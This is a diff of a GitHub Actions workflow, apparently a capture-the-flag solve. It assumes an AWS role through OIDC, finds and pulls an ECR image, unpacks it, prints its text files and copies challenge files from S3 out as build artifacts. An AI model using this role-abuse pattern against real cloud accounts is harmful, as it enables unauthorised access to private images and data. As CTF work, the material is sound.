@@ -11,30 +11,31 @@ jobs:
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
-          aws-region: us-east-1
+          aws-region: ap-east-1
           role-session-name: OIDCSession
       - name: List ECR repositories
         run: |
-          aws ecr describe-repositories --region us-east-1
-      - name: List S3 buckets
-        run: |
-          aws s3 ls
+          aws ecr describe-repositories --region ap-east-1
       - name: Login to ECR
         run: |
-          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
+          aws ecr get-login-password --region ap-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com
       - name: Pull and inspect image
         run: |
-          # Replace with the actual ECR repository name found from listing
-          docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/imaginary-challenge:latest
-          docker save 396961015104.dkr.ecr.us-east-1.amazonaws.com/imaginary-challenge:latest -o image.tar
-          tar -xf image.tar
-          find . -name "rockyou.txt" -type f -exec cp {} ./ \;
-          find . -name "*.txt" -type f -exec grep -l "base64" {} \; || true
+          REPO=$(aws ecr describe-repositories --region ap-east-1 --query 'repositories[0].repositoryName' --output text)
+          if [ "$REPO" != "None" ]; then
+            echo "Repository found: $REPO"
+            docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$REPO:latest
+            docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$REPO:latest -o image.tar
+            tar -xf image.tar
+            find . -name "rockyou.txt" -type f -exec cp {} ./ \;
+            find . -name "*.txt" -type f -exec cat {} \; || true
+          else
+            echo "No ECR repositories found"
+          fi
       - name: Download from S3
         run: |
-          # If S3 buckets are found, download relevant files
-          aws s3 cp s3://imaginary-challenge/output.txt ./ || true
-          aws s3 cp s3://imaginary-challenge/rockyou.txt ./ || true
+          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/output.txt ./ || echo "No output.txt"
+          aws s3 cp s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/rockyou.txt ./ || echo "No rockyou.txt"
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
         with:
